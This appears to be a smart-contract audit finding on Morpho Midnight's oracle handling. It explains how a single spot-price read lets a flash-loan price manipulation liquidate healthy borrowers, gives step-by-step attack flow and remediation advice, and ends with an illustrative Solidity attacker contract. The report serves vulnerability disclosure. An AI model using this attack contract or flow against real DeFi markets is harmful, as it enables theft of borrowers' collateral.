### Title
Single-Block Spot Oracle Price Manipulation Enables Liquidation of Healthy Positions — (`src/Midnight.sol`)

---

### Summary

Morpho Midnight's `liquidate()` and `isHealthy()` functions determine collateral value by calling `IOracle(collateralParam.oracle).price()` exactly once per collateral, with no TWAP requirement, no circuit breaker, and no price-deviation guard. Because market creation is permissionless and the protocol accepts any address implementing `IOracle`, a market can be deployed with a DEX spot-price oracle. An attacker can flash-loan the collateral token, depress its spot price within the same transaction, and liquidate an otherwise healthy borrower for profit before the price recovers.

---

### Finding Description

**Root cause — single spot-price read with no manipulation resistance**

`isHealthy()` computes `maxDebt` by iterating over every activated collateral and calling the oracle once: [1](#0-0) 

`liquidate()` does the same to determine both `maxDebt` (for the `NotLiquidatable` guard) and `liquidatedCollatPrice` (for the seized-asset calculation): [2](#0-1) 

The liquidatability check then compares the oracle-derived `maxDebt` against `originalDebt`: [3](#0-2) 

The `IOracle` interface imposes no constraints on how the price is sourced: [4](#0-3) 

The oracle address is embedded in `CollateralParams` at market creation time and is immutable thereafter: [5](#0-4) 

Market creation is permissionless (`touchMarket` is `public`), so any caller can deploy a market pointing to a DEX spot-price oracle: [6](#0-5) 

**End-to-end exploit flow (single transaction)**

1. Attacker identifies (or creates) a market whose collateral oracle reads a Uniswap V3 / Curve spot price.
2. Attacker flash-loans a large amount of the collateral token from any flash-loan provider (including Midnight's own `flashLoan`).
3. Attacker dumps the collateral token on the DEX pool, depressing the spot price by the required percentage.
4. Attacker calls `liquidate()` on a healthy borrower. The oracle returns the manipulated price; `maxDebt` is computed lower than the true value; `originalDebt > maxDebt` becomes true; `NotLiquidatable` does not revert.
5. Attacker seizes collateral at the artificially low `liquidatedCollatPrice`, repays the flash loan, and keeps the spread as profit.
6. The DEX price recovers in the same or next block; the victim's position is permanently damaged.

The `liquidate()` function also uses `liquidatedCollatPrice` to compute `seizedAssets` when `repaidUnits` is the input: [7](#0-6) 

A depressed price means more collateral is seized per unit of debt repaid, amplifying the attacker's profit.

---

### Impact Explanation

- **Direct theft of collateral** from borrowers whose positions are healthy at the true market price.
- The liquidation incentive factor (LIF) is up to `1 / (1 − γ(1 − LLTV))`. For `LLTV = 0.86` and `γ = 0.5`, `maxLif ≈ 1.074`. The attacker captures this bonus on top of the price-manipulation spread.
- Bad debt can also be artificially triggered: if the manipulated price is low enough, `badDebt > 0` in `liquidate()`, which socialises losses across all lenders in the market. [8](#0-7) 

---

### Likelihood Explanation

- Market creation is permissionless; any actor can deploy a market with a DEX spot-price oracle. Borrowers may not inspect the oracle implementation before entering.
- Flash-loan liquidity sufficient to move thin DEX pools is widely available (Aave, Balancer, Uniswap V3 itself, and Midnight's own `flashLoan`).
- The attack is atomic (single transaction), so there is no front-running risk for the attacker and no time for the victim to react.
- High-LLTV markets (e.g., `0.965`, `0.98`) require only a small price move to cross the liquidation threshold, reducing the capital needed for manipulation. [9](#0-8) 

---

### Recommendation

1. **Require TWAP-based oracles**: Document and enforce (via a registry or on-chain check) that oracles must return a time-weighted average price over at least one block, making single-block manipulation economically unviable.
2. **Add a price-deviation circuit breaker**: Before accepting a price, compare it against a secondary reference (e.g., Chainlink) and revert if the deviation exceeds a threshold.
3. **Open-interest / borrow caps per market**: Limit the total debt in a market so that even a successful manipulation attack has a bounded impact.
4. **Warn market creators**: Add explicit NatSpec on `touchMarket` that spot-price oracles expose borrowers to flash-loan liquidation attacks.

pragma solidity 0.8.34;

// Attacker contract — illustrative, not compiled against full repo
contract FlashLiquidationAttack {
    IMidnight midnight;
    IUniswapV3Pool pool;
    IERC20 collateralToken;
    IERC20 loanToken;

    function attack(
        Market calldata market,
        uint256 collateralIndex,
        address victim,
        uint256 repaidUnits
    ) external {
        // 1. Flash-loan collateral from Midnight itself
        address[] memory tokens = new address[](1);
        tokens[0] = address(collateralToken);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = LARGE_AMOUNT;
        midnight.flashLoan(tokens, amounts, address(this), abi.encode(market, collateralIndex, victim, repaidUnits));
    }

    function onFlashLoan(
        address, address[] calldata, uint256[] calldata, bytes calldata data
    ) external returns (bytes32) {
        (Market memory market, uint256 collateralIndex, address victim, uint256 repaidUnits) =
            abi.decode(data, (Market, uint256, address, uint256));

        // 2. Dump collateral on DEX → spot price drops
        pool.swap(address(this), true, int256(LARGE_AMOUNT), MIN_SQRT_RATIO, "");

        // 3. Liquidate the now-"unhealthy" victim
        //    oracle.price() returns the manipulated spot price
        midnight.liquidate(market, collateralIndex, 0, repaidUnits, victim, false, address(this), address(0), "");

        // 4. Buy back collateral at depressed price (optional, to repay flash loan)
        pool.swap(address(this), false, int256(seizedCollateral), MAX_SQRT_RATIO, "");

        // 5. Repay flash loan
        collateralToken.transfer(address(midnight), LARGE_AMOUNT);
        return keccak256("morpho.midnight.callbackSuccess");
    }
}
